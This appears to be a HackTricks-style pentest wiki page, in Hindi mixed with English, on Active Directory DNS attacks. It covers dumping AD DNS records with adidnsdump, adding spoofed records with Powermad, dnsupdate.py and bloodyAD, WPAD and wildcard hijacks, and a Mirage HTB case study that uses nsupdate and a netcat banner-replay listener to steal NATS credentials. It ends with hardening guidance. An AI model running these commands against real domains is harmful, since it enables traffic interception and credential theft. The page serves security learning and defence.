# AD DNS रिकॉर्ड्स

{{#include ../../banners/hacktricks-training.md}}

डिफ़ॉल्ट रूप से Active Directory में **कोई भी उपयोगकर्ता** Domain या Forest DNS zones में **enumerate all DNS records** कर सकता है, जो कि एक zone transfer के समान है (users एक DNS zone के child objects को AD environment में सूचीबद्ध कर सकते हैं)।

यह टूल [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) ज़ोन में **enumeration** और **exporting** के माध्यम से **all DNS records** को एक्सपोर्ट करने में सक्षम बनता है, जो आंतरिक नेटवर्क्स की recon आवश्यकताओं के लिए उपयोगी है।
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) JSON/Greppable (`--json`) आउटपुट, multi-threaded DNS resolution और LDAPS से बाइंड करते समय TLS 1.2/1.3 के समर्थन को जोड़ता है।

For more information read [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## रिकॉर्ड बनाना / संशोधित करना (ADIDNS spoofing)

डिफ़ॉल्ट रूप से zone DACL पर **Authenticated Users** group के पास **Create Child** परमिशन होने के कारण, कोई भी domain account (या computer account) अतिरिक्त रिकॉर्ड रजिस्टर कर सकता है। यह traffic hijacking, NTLM relay coercion या यहां तक कि पूर्ण domain compromise के लिए इस्तेमाल किया जा सकता है।

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py Impacket ≥0.12.0 के साथ आता है)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Common attack primitives

1. **Wildcard record** – `*.<zone>` AD DNS server को LLMNR/NBNS spoofing जैसा enterprise-wide responder बना देता है। इसे NTLM hashes कैप्चर करने या उन्हें LDAP/SMB पर relay करने के लिए abusing किया जा सकता है। (Requires WINS-lookup to be disabled.)
2. **WPAD hijack** – `wpad` जोड़ें (या attacker host की ओर इशारा करने वाला एक **NS** रिकॉर्ड ताकि Global-Query-Block-List bypass हो) और outbound HTTP requests को transparently proxy करके credentials harvest करें। Microsoft ने wildcard/DNAME bypasses (CVE-2018-8320) को patch किया लेकिन **NS-records अभी भी काम करते हैं**।
3. **Stale entry takeover** – उस IP address का दावा करें जो पहले किसी workstation का था और associated DNS entry अभी भी resolve होगी, जिससे resource-based constrained delegation या Shadow-Credentials attacks DNS को छुए बिना संभव हो जाते हैं।
4. **DHCP → DNS spoofing** – एक default Windows DHCP+DNS deployment पर same subnet का एक unauthenticated attacker किसी भी मौजूदा A record (जिसमें Domain Controllers भी शामिल हैं) को overwrite कर सकता है, forged DHCP requests भेजकर जो dynamic DNS updates ट्रिगर करते हैं (Akamai “DDSpoof”, 2023)। इससे Kerberos/LDAP पर machine-in-the-middle होता है और यह full domain takeover तक ले जा सकता है।
5. **Certifried (CVE-2022-26923)** – उस machine account का `dNSHostName` बदलें जिसे आप कंट्रोल करते हैं, एक matching A record register करें, फिर उस नाम के लिए certificate request करके DC का impersonate करें। Certipy या BloodyAD जैसे tools पूरी flow को automate करते हैं।

---

### Internal service hijacking via stale dynamic records (NATS case study)

जब dynamic updates सभी authenticated users के लिए खुले रहते हैं, **a de-registered service name can be re-claimed and pointed to attacker infrastructure**। Mirage HTB DC ने DNS scavenging के बाद hostname `nats-svc.mirage.htb` expose किया था, इसलिए कोई भी low-privileged user कर सकता था:

1. **Confirm the record is missing** and learn the SOA with `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Re-create the record** उनके नियंत्रण वाले बाहरी/VPN इंटरफेस की ओर:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Impersonate the plaintext service**. NATS क्लाइंट्स अपेक्षा करते हैं कि वे credentials भेजने से पहले एक `INFO { ... }` बैनर देखें, इसलिए वास्तविक ब्रोकर से एक वैध बैनर कॉपी करना गुप्त जानकारी एकत्र करने के लिए पर्याप्त है:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Any client that resolves the hijacked name will immediately leak its JSON `CONNECT` frame (including `"user"`/`"pass"`) to the listener. Running the official `nats-server -V` binary on the attacker host, disabling its log redaction, or just sniffing the session with Wireshark yields the same plaintext credentials because TLS was optional.

4. **Pivot with the captured creds** – Mirage में stolen NATS account ने JetStream access प्रदान किया, जिससे historic authentication events उजागर हुए जिनमें reusable AD usernames/passwords शामिल थे।

This pattern applies to every AD-integrated service that relies on unsecured TCP handshakes (HTTP APIs, RPC, MQTT, etc.): once the DNS record is hijacked, the attacker becomes the service.

---

## Detection & hardening

* संवेदनशील zones पर **Authenticated Users** को *Create all child objects* अधिकार deny करें और dynamic updates को DHCP द्वारा उपयोग किए जाने वाले dedicated account को delegate करें।
* यदि dynamic updates आवश्यक हैं, तो zone को **Secure-only** पर सेट करें और DHCP में **Name Protection** सक्षम करें ताकि केवल owner computer object अपना ही record overwrite कर सके।
* DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) और LDAP writes को `CN=MicrosoftDNS,DC=DomainDnsZones` पर monitor करें।
* जोख़िम भरे names (`wpad`, `isatap`, `*`) को intentionally-benign record से या Global Query Block List के माध्यम से block करें।
* DNS servers को patched रखें – जैसे RCE bugs CVE-2024-26224 और CVE-2024-26231 ने **CVSS 9.8** प्राप्त किया और Domain Controllers के खिलाफ remotely exploitable हैं।


## References

- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, अभी भी wildcard/WPAD attacks के लिए de-facto reference)
- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
{{#include ../../banners/hacktricks-training.md}}
